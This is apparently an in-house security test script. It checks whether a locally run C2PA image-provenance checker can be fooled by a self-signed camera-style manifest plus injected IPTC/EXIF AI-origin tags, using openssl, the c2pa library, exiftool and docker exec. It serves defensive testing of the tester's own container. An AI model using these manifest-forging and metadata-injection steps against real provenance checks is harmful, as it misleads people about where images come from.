"""Attack: C2PA + EXIF Trust Chain Bypass

Vulnerability hypothesis: If a file has a valid C2PA manifest from a non-AI
source, the c2pa-checker trusts EXIF/IPTC AI tags. An attacker can:
1. Create a C2PA manifest with self-signed cert (no AI generator strings)
2. Inject EXIF/IPTC AI metadata
3. The system may trust the injected tags because has_valid_c2pa=True

This tests whether self-signed C2PA manifests pass validation.
"""

import base64
import io
import json
import os
import struct
import subprocess
import sys
import tempfile
import time
import urllib.request

import numpy as np
from PIL import Image


def predict(url, payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{url}/predict",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    try:
        resp = urllib.request.urlopen(req, timeout=120)
        return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"error": f"HTTP {e.code}: {e.read().decode()[:200]}"}
    except Exception as e:
        return {"error": str(e)}


C2PA_URL = "http://localhost:9011"
results = []


def log_result(name, result, expected, severity="INFO"):
    prob = result.get("probability", -1)
    entry = {
        "attack": name,
        "probability": prob,
        "class": result.get("class", "error"),
        "expected": expected,
        "severity": severity,
        "raw": result,
    }
    results.append(entry)
    icon = "!!!" if prob > 0.5 and "neutral" in expected.lower() else "OK "
    print(f"  [{icon}] {name}: prob={prob:.4f} | {expected}")
    return entry


print("=" * 70)
print("ATTACK: C2PA + EXIF Trust Chain Bypass")
print("=" * 70)

# ── Sub-attack 1: Build C2PA manifest inside the container ──────────────
print("\n--- 1a: C2PA Builder with self-signed cert (inside container) ---")

# We'll exec into the container to build a C2PA-signed image
# This avoids needing c2pa-python installed locally
attack_script = """
import c2pa
import json
import base64
import os
import tempfile
import sys
from PIL import Image
import numpy as np

# Create a real-looking image (256x256 random noise)
arr = np.random.randint(50, 200, (256, 256, 3), dtype=np.uint8)
img = Image.fromarray(arr)
src_path = "/tmp/real_photo.jpg"
img.save(src_path, format="JPEG", quality=95)

# Generate a self-signed certificate for C2PA signing
import subprocess
key_path = "/tmp/c2pa_key.pem"
cert_path = "/tmp/c2pa_cert.pem"

subprocess.run([
    "openssl", "req", "-x509", "-newkey", "ec",
    "-pkeyopt", "ec_paramgen_curve:P-256",
    "-keyout", key_path, "-out", cert_path,
    "-days", "1", "-nodes",
    "-subj", "/CN=TestCamera/O=CameraManufacturer/C=US"
], capture_output=True, check=True)

# Read key and cert
with open(key_path, "rb") as f:
    key_pem = f.read()
with open(cert_path, "rb") as f:
    cert_pem = f.read()

# Build a C2PA manifest that looks like it came from a camera (not AI)
manifest_json = json.dumps({
    "claim_generator": "TestCamera/1.0",
    "title": "IMG_20260329_001.jpg",
    "format": "image/jpeg",
    "assertions": [
        {
            "label": "stds.schema-org.CreativeWork",
            "data": {
                "@type": "CreativeWork",
                "author": [{"@type": "Person", "name": "Photographer"}]
            }
        },
        {
            "label": "c2pa.actions",
            "data": {
                "actions": [
                    {
                        "action": "c2pa.created",
                        "digitalSourceType": "http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture",
                        "softwareAgent": "TestCamera/1.0"
                    }
                ]
            }
        }
    ]
})

try:
    # Create signer
    signer = c2pa.Signer(
        sign_alg=c2pa.C2paSigningAlg.ES256,
        private_key=key_pem,
        sign_cert=cert_pem,
    )

    # Build and sign
    builder = c2pa.Builder(manifest_json)
    output_path = "/tmp/c2pa_signed_camera.jpg"
    builder.sign_file(signer, src_path, output_path)

    # Read the signed file
    with open(output_path, "rb") as f:
        signed_bytes = f.read()

    # Verify it has a C2PA manifest
    try:
        reader = c2pa.Reader.from_file(output_path)
        manifest = reader.json()
        print(f"C2PA_MANIFEST_FOUND: len={len(manifest)}")

        # Check validation status
        try:
            status = reader.validation_status
            print(f"VALIDATION_STATUS: {status}")
            if status:
                print("SIGNATURE_VALID: False (has validation issues)")
            else:
                print("SIGNATURE_VALID: True (no issues)")
        except Exception as e:
            print(f"VALIDATION_CHECK_ERROR: {e}")

        # Check if manifest contains any AI generator strings
        ai_gens = ["adobe firefly", "dall-e", "openai", "midjourney",
                    "stable diffusion", "stability ai"]
        manifest_lower = manifest.lower()
        found_ai = [g for g in ai_gens if g in manifest_lower]
        print(f"AI_GENERATORS_FOUND: {found_ai}")
    except Exception as e:
        print(f"C2PA_READ_ERROR: {e}")

    # Output base64 for testing
    print(f"SIGNED_B64:{base64.b64encode(signed_bytes).decode()}")

except Exception as e:
    print(f"BUILD_ERROR: {e}")
    import traceback
    traceback.print_exc()
"""

# Write the script to a temp file and copy into container
with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
    f.write(attack_script)
    script_path = f.name

try:
    # Copy script into container
    subprocess.run(
        ["docker", "cp", script_path, "deepsafe-c2pa-checker:/tmp/attack.py"],
        check=True,
        capture_output=True,
    )

    # Run inside container
    result = subprocess.run(
        ["docker", "exec", "deepsafe-c2pa-checker", "python3", "/tmp/attack.py"],
        capture_output=True,
        text=True,
        timeout=60,
    )

    print("  Container output:")
    for line in result.stdout.strip().split("\n"):
        print(f"    {line}")
    if result.stderr:
        print(f"  Stderr: {result.stderr[:500]}")

    # Extract the signed image base64
    signed_b64 = None
    sig_valid = None
    for line in result.stdout.split("\n"):
        if line.startswith("SIGNED_B64:"):
            signed_b64 = line.split(":", 1)[1]
        if "SIGNATURE_VALID:" in line:
            sig_valid = "True" in line

    if signed_b64:
        # Test 1: Send the C2PA-signed image (no EXIF injection) to c2pa_checker
        print("\n  Testing C2PA-only signed image...")
        resp = predict(C2PA_URL, {"image_data": signed_b64})
        log_result(
            "C2PA self-signed camera image (no AI metadata)",
            resp,
            "Expected: neutral 0.5 (no AI generators in manifest)",
        )

        # Test 2: Now inject EXIF AI tags into the signed image
        signed_bytes = base64.b64decode(signed_b64)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
            tmp.write(signed_bytes)
            injected_path = tmp.name

        try:
            # Inject IPTC DigitalSourceType for AI
            subprocess.run(
                [
                    "exiftool",
                    "-overwrite_original",
                    "-XMP-iptcExt:DigitalSourceType="
                    "http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia",
                    injected_path,
                ],
                capture_output=True,
                check=True,
            )

            with open(injected_path, "rb") as f:
                injected_bytes = f.read()

            print("\n  Testing C2PA-signed + EXIF AI injection...")
            resp = predict(
                C2PA_URL, {"image_data": base64.b64encode(injected_bytes).decode()}
            )
            entry = log_result(
                "C2PA self-signed + IPTC AI injection",
                resp,
                "CRITICAL if > 0.5: trust chain bypass! Should be neutral 0.5",
                severity="CRITICAL" if resp.get("probability", 0) > 0.5 else "INFO",
            )

            # Test 3: Inject EXIF Software field too
            subprocess.run(
                [
                    "exiftool",
                    "-overwrite_original",
                    "-Software=Midjourney v6.0",
                    "-EXIF:ImageDescription=Generated by Stable Diffusion XL",
                    injected_path,
                ],
                capture_output=True,
                check=True,
            )

            with open(injected_path, "rb") as f:
                double_injected = f.read()

            print("\n  Testing C2PA-signed + full EXIF AI injection...")
            resp = predict(
                C2PA_URL, {"image_data": base64.b64encode(double_injected).decode()}
            )
            log_result(
                "C2PA self-signed + EXIF Software/Description AI injection",
                resp,
                "CRITICAL if > 0.5: trust chain bypass! Should be neutral 0.5",
                severity="CRITICAL" if resp.get("probability", 0) > 0.5 else "INFO",
            )
        except Exception as e:
            print(f"  EXIF injection failed: {e}")
        finally:
            if os.path.exists(injected_path):
                os.unlink(injected_path)

        # Key insight: Even if self-signed fails validation, the REAL attack
        # uses a legitimately signed C2PA manifest from a non-AI source
        # (e.g., Adobe Photoshop, Leica camera) and then injects EXIF tags.
        # The self-signed test tells us if the validation check gates properly.
        print(f"\n  Self-signed C2PA validation result: sig_valid={sig_valid}")
        if sig_valid:
            print(
                "  WARNING: Self-signed certs pass validation! Trust chain bypass CONFIRMED."
            )
        else:
            print("  Self-signed certs fail validation (expected).")
            print(
                "  BUT: The real attack uses legitimately signed C2PA from cameras/editors."
            )
            print("  If such a file exists, the EXIF injection would be trusted.")

    else:
        print("  Failed to create C2PA signed image")

finally:
    os.unlink(script_path)


# ── Sub-attack 2: Test if exiftool modifying a C2PA file breaks the manifest ──
print("\n--- 1b: Does exiftool break C2PA manifests? ---")
print("    (If exiftool preserves C2PA while modifying EXIF, the attack works)")

if signed_b64:
    # Check: after exiftool injection, does C2PA still validate?
    check_script = """
import c2pa
import sys

try:
    reader = c2pa.Reader.from_file(sys.argv[1])
    manifest = reader.json()
    print(f"C2PA_PRESENT: True")
    try:
        status = reader.validation_status
        if status:
            print(f"VALIDATION_STATUS: {status}")
            print("SIG_VALID: False")
        else:
            print("VALIDATION_STATUS: None")
            print("SIG_VALID: True")
    except Exception as e:
        print(f"VALIDATION_ERROR: {e}")
except Exception as e:
    print(f"C2PA_PRESENT: False ({e})")
"""
    # Re-create the injected file
    with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
        tmp.write(base64.b64decode(signed_b64))
        check_path = tmp.name

    subprocess.run(
        [
            "exiftool",
            "-overwrite_original",
            "-XMP-iptcExt:DigitalSourceType="
            "http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia",
            check_path,
        ],
        capture_output=True,
        check=True,
    )

    # Copy file and script into container
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(check_script)
        check_script_path = f.name

    subprocess.run(
        ["docker", "cp", check_path, "deepsafe-c2pa-checker:/tmp/injected.jpg"],
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["docker", "cp", check_script_path, "deepsafe-c2pa-checker:/tmp/check_c2pa.py"],
        check=True,
        capture_output=True,
    )

    result = subprocess.run(
        [
            "docker",
            "exec",
            "deepsafe-c2pa-checker",
            "python3",
            "/tmp/check_c2pa.py",
            "/tmp/injected.jpg",
        ],
        capture_output=True,
        text=True,
        timeout=30,
    )
    print("  After exiftool IPTC injection:")
    for line in result.stdout.strip().split("\n"):
        print(f"    {line}")

    os.unlink(check_path)
    os.unlink(check_script_path)


# Save results
import json as json_mod

output = os.path.join(os.path.dirname(__file__), "results_c2pa_bypass.json")
with open(output, "w") as f:
    json_mod.dump(results, f, indent=2, default=str)
print(f"\nResults saved to {output}")
